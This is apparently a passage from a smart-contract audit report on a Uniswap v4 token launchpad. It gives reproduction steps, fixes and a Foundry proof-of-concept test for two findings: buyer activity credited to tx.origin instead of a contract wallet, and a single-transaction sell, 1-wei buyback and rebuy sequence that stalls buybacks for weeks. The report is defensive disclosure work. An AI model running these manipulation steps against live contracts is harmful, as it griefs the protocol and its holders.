Fix: have PepesFamilyEthRouter pass `abi.encode(r.user)` as hookData on the token-pool swap and accept `sender == ethRouter` next to `sender == router` on this line (audit_economics validated this on a copy: the proof passes and the 56 PepesFamily tests still pass). For third-party routers `tx.origin` stays best effort: say so in the notice and README instead of promising 'any router', or additionally count a transfer from the PoolManager to a non-excluded recipient as that recipient's activity.

**Reproduction**

State: a contract wallet W (exec(target, value, data)) whose owner key O signs its transactions; a v4 token T; the launchpad's PepesFamilyEthRouter with an ETH/IMD pool (ETH currency0, IMD currency1, fee 10000, spacing 100, no hook).
Steps: 1. Day 0: O makes W call `ethRouter.buyWithEth{value: 1 ether}(T, 0, deadline)` (vm.prank(O, O)); first receipt so `lastActive[W]` = day 0. 2. carol buys T for 100 IMD through PepesFamilyRouter, W is owed rewards. 3. Day 6: O makes W call `buyWithEth{value: 0.01 ether}` (below a tenth of W's bag). 4. Day 7 + 1 s: anyone calls `T.recycle(W)`.
Expected (PadToken notice, README): `lastActive[W]` = day 6 and `expiredRewardsOf(W)` = 0.
Actual: `lastActive[W]` is still day 0 (1800000000) and `lastActive[O]` = day 6 (1800518400) although O holds nothing; W's rewards are recyclable one day after its last buy. The same happens through a third-party router (v4-core's PoolSwapTest with W as the caller and O as tx.origin): reproduced in test/scratch, not attached.
Run: `cd contracts && forge test --match-path test/scratch/BuyerAttribution.t.sol -vv` fails with "a buy through the ETH router must restart the buyer's timer: 1800000000 != 1800518400".

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {PoolModifyLiquidityTest} from "v4-core/src/test/PoolModifyLiquidityTest.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {ModifyLiquidityParams} from "v4-core/src/types/PoolOperation.sol";

import {PepesFamily} from "src/PepesFamily.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";
import {PepesFamilyEthRouter} from "src/PepesFamilyEthRouter.sol";
import {PadToken} from "src/PadToken.sol";

contract MockIMD {
    string public name = "Identity.md";
    string public symbol = "IMD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev The launchpad needs a wired buyback (never used here): this reports an initialised IMD pair.
contract WiringStub {
    PoolKey internal key;

    function setKey(PoolKey memory k) external {
        key = k;
    }

    function pad() external view returns (address) {
        return address(this);
    }

    function poolKey(address) external view returns (PoolKey memory) {
        return key;
    }
}

/// @dev A minimal smart-contract wallet: an owner key signs a transaction that makes the wallet call `target`.
///      Stands in for a Safe, an ERC-4337 account or any contract that buys for itself.
contract Wallet {
    function exec(address target, uint256 value, bytes calldata data) external returns (bytes memory ret) {
        bool ok;
        (ok, ret) = target.call{value: value}(data);
        require(ok, "wallet call failed");
    }

    receive() external payable {}
}

/// @notice IMD Swarm re-check of audit ec4e3ea7, finding 3 (a buy through any router is the buyer's activity).
///         `afterSwap` only trusts hookData from PepesFamilyRouter and otherwise marks `tx.origin`. The launchpad's
///         own PepesFamilyEthRouter passes no hookData, so a buy by a contract wallet through it marks the key that
///         signed the transaction, not the wallet that receives the tokens and accrues the rewards.
contract BuyerAttributionTest is Test {
    uint160 constant HOOK_FLAGS = 0x28CC;
    int24 constant START_TICK = 161_000; // ~100 IMD starting market cap

    PoolManager pm;
    MockIMD imd;
    PepesFamily pad;
    PepesFamilyRouter router;
    PepesFamilyEthRouter ethRouter;
    PadToken token;
    Wallet wallet;

    address operator = makeAddr("operator"); // the key that signs the wallet's transactions
    address carol = makeAddr("carol");

    receive() external payable {}

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new MockIMD();

        WiringStub stub = new WiringStub();
        (address c0, address c1) =
            address(stub) < address(imd) ? (address(stub), address(imd)) : (address(imd), address(stub));
        PoolKey memory k = PoolKey(Currency.wrap(c0), Currency.wrap(c1), 3000, 60, IHooks(address(0)));
        pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
        stub.setKey(k);

        pad = _deployPad(address(stub), address(stub));
        router = PepesFamilyRouter(payable(pad.router()));
        ethRouter = PepesFamilyEthRouter(payable(pad.ethRouter()));
        token = PadToken(payable(pad.launch("Test", "TST", "", address(imd))));

        // The IMD/ETH pool the ETH router uses: ETH is currency0, IMD currency1, fee 10000, spacing 100, no hook.
        PoolModifyLiquidityTest lp = new PoolModifyLiquidityTest(pm);
        PoolKey memory ethKey =
            PoolKey(Currency.wrap(address(0)), Currency.wrap(address(imd)), 10_000, 100, IHooks(address(0)));
        pm.initialize(ethKey, TickMath.getSqrtPriceAtTick(0)); // 1 ETH = 1 IMD
        imd.mint(address(this), 100_000e18);
        imd.approve(address(lp), type(uint256).max);
        vm.deal(address(this), 100_000 ether);
        lp.modifyLiquidity{value: 20_000 ether}(ethKey, ModifyLiquidityParams(-887200, 887200, 10_000e18, 0), "");

        wallet = new Wallet();
        vm.deal(address(wallet), 100 ether);
        imd.mint(carol, 1_000e18);
        vm.prank(carol);
        imd.approve(address(router), type(uint256).max);
    }

    function _deployPad(address pepes_, address pepesRouter_) internal returns (PepesFamily p) {
        bytes memory initCode = abi.encodePacked(
            type(PepesFamily).creationCode,
            abi.encode(
                pm,
                address(imd),
                address(this),
                address(this),
                START_TICK,
                PepesFamily.ImdEthPool(10_000, 100, address(0)),
                pepes_,
                pepesRouter_
            )
        );
        bytes32 initCodeHash = keccak256(initCode);
        for (uint256 salt;; salt++) {
            address a = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initCodeHash))))
            );
            if (uint160(a) & 0x3FFF != HOOK_FLAGS) continue;
            assembly {
                p := create2(0, add(initCode, 0x20), mload(initCode), salt)
            }
            require(address(p) == a, "hook address");
            return p;
        }
    }

    /// The operator signs; the wallet buys through the pad's own ETH router and receives the tokens.
    function _walletBuysWithEth(uint256 value) internal {
        vm.prank(operator, operator);
        wallet.exec(
            address(ethRouter),
            value,
            abi.encodeCall(PepesFamilyEthRouter.buyWithEth, (address(token), 0, vm.getBlockTimestamp()))
        );
    }

    function test_contractWalletBuyThroughEthRouterMustMarkTheWallet() public {
        uint256 t0 = vm.getBlockTimestamp();
        _walletBuysWithEth(1 ether); // first receipt: lastActive[wallet] = t0
        assertEq(token.lastActive(address(wallet)), t0);
        assertGt(token.balanceOf(address(wallet)), 0);

        vm.prank(carol); // carol's buy pays the wallet a holder reward
        router.buy(address(token), 100e18, 0, t0);
        uint256 owed = token.withdrawableDividendOf(address(wallet));
        assertGt(owed, 0, "the wallet is owed rewards");

        // day 6: the wallet buys again (a top-up below a tenth of its bag) through the launchpad's own ETH router
        vm.warp(t0 + 6 days);
        _walletBuysWithEth(0.01 ether);

        emit log_named_uint("lastActive[wallet]  ", token.lastActive(address(wallet)));
        emit log_named_uint("lastActive[operator]", token.lastActive(operator));
        assertEq(
            token.lastActive(address(wallet)), t0 + 6 days, "a buy through the ETH router must restart the buyer's timer"
        );

        // one day after its last buy, the wallet's rewards must not be recyclable
        vm.warp(t0 + 7 days + 1);
        assertEq(token.expiredRewardsOf(address(wallet)), 0, "the wallet bought a day ago");
        assertEq(token.recycle(address(wallet)), 0, "nothing to recycle");
    }
}
```

### 5. Low: Buyback reference is a single spot read the caller can bracket: sell, buyback (1 wei is enough), rebuy in one transaction pins the reference low and stalls every v4 buyback for days to weeks

`contracts/src/PepesBuyback.sol:174`

```
        (sqrtP,,,) = IPoolManager(poolManager).getSlot0(_poolId());
```

Merged from audit_permissions 59b25c46, audit_flow 956f8f31, audit_math 62a8ff78 and audit_economics 9365488e; reproduced with the economics numbers exactly.

`priceRiseBps()` treats any fall as 0 (line 144), so a buyback always runs into a dumped price, and line 132 then stores that dumped spot price as `refSqrtPrice`. Both the constructor read (line 99, so also by front-running the launchpad's CREATE2 deployment) and the post-buyback read (line 174 via line 132) are one-block spot prices the caller controls. A $PEPES holder sells, calls `buybackAndBurnPepes`, and buys back in the same transaction: the pool returns to where it was but reads as far above the reference, and no v4 buyback runs until the 2%/day allowance has caught up, (1/(1-d) - 1.02)/0.02 days for a dip of d. The reserve need not hold anything: `imdIn` only has to be non-zero (line 122), so with an empty reserve the caller sends 1 wei of IMD first; that 1-wei call also sets `lastBuyback`, so a real reserve arriving in the same hour reverts `TooSoon` (checked). Unlike the documented 'a pump stalls the buyback' case the attacker holds no pumped position afterwards; the cost is the 4% hook fee each way on the amount moved while the stall grows with 1/(1-d) and can be repeated whenever the allowance catches up. Measured (depth 1,061.9 IMD): a 4.3%-of-depth round trip stalls 4 days for ~3.8 IMD; 15.2% stalls 18 days for ~13.4 IMD; 30.7% stalls 52 days for ~27 IMD (about 128 IMD at the live pool's ~4,975 IMD depth).

Impact: no IMD is lost, it waits, so this is griefing of the buyback's pace; it also lets a reserve pile up for the hourly series of the re-anchoring finding. `test_fallingPriceNeverBlocks` and `test_organicRiseOnlyDelays` cover a fall and a rise but not a dip undone right after the buyback.

Fix (trade-offs for the requester): do not take the reference from one spot read the caller can bracket. Options: record the reference as the price BEFORE the buyback's own swap or the max of pre- and post-swap price; let the reference fall by only a bounded step per buyback (looser guard after a genuine crash); or build it from observations over time (permissionless poke, time-weighted), which also removes the deployment front-run. Independently require a minimum spend (a share of `maxBuyback()`) before a call may move the reference and take the hourly slot, so 1 wei cannot. The ratchet fix of the re-anchoring finding does not remove this on its own.

**Reproduction**

State: test/PepesBuyback.t.sol world (depth 1,061.9 IMD; bob holds 904,033,088 $PEPES), buyback reserve empty, reference fresh.
Steps, all in one block by bob: 1. send 1 wei of IMD to the buyback. 2. `routerA.sell(pepes, bag/20, 0, now)` (45.2M $PEPES for 326.4 IMD); `priceRiseBps()` == 0. 3. `buybackAndBurnPepes(0, now)` succeeds, spends the 1 wei and records the dumped price. 4. `routerA.buy(pepes, 326.4 IMD)`. Then 100 IMD of expired rewards reach the buyback and anyone tries the buyback hourly.
Expected: bob ends with the position he started with (same IMD, ~2.7M fewer $PEPES in fees), so buybacks keep running hourly ('a falling price never blocks the buyback').
Actual: `priceRiseBps()` = 10,566 against `allowedPriceRiseBps()` = 200; `buybackAndBurnPepes` reverts `PriceRisen` for 1,243 hours (52 days) with IMD waiting. bob: IMD unchanged, $PEPES 904,033,088 -> 901,561,959. Also: after a 1-wei buyback a call with a 100 IMD reserve in the same hour reverts `TooSoon`.
Run: `cd contracts && forge test --match-path test/scratch/DumpStall.t.sol -vv` (judge's scratch test): test_sellBuybackRebuyPinsReferenceLow fails with "... must not stall buybacks: 1243 != 0"; test_oneWeiBuybackTakesTheSlot passes (behaviour confirmed).

---

Judge's submission `2609af5a3f9b907084d0269338f6b2fbaef2d8a1d76071f49d03cd3c74f87943`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
